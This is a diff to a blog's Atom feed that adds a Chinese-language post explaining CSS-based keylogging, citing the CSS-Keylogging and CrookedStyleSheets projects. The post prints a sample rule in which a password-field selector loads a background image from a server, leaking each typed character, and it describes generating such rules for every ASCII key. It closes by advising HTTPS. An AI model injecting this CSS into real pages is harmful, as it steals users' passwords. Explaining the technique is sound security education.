@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.minfive.com/"/>
-  <updated>2018-01-07T14:14:34.021Z</updated>
+  <updated>2018-02-23T15:10:09.505Z</updated>
   <id>http://blog.minfive.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>使用 Css 获取用户密码</title>
+    <link href="http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/"/>
+    <id>http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/</id>
+    <published>2018-02-22T16:00:00.000Z</published>
+    <updated>2018-02-23T15:10:09.505Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a>，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与一两个月前的另外一个很火的项目 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a> 类似，甚至于有可能 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 就是受 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a> 启发才创建的。</p><h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="external">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="external">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">input</span><span class="selector-attr">[type="password"]</span><span class="selector-attr">[value$="1"]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"http://localhost:3000/1"</span>); &#125;</div></pre></td></tr></table></figure><p>解释如下：</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="http://oo12ugek5.bkt.clouddn.com/blog/images/18-02-23/code.png" alt="code"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 &lt;a href=&quot;https://github.com/maxcheh
+      
+    
+    </summary>
+    
+      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+      <category term="css" scheme="http://blog.minfive.com/tags/css/"/>
+    
+      <category term="安全" scheme="http://blog.minfive.com/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>30s代码片段翻译</title>
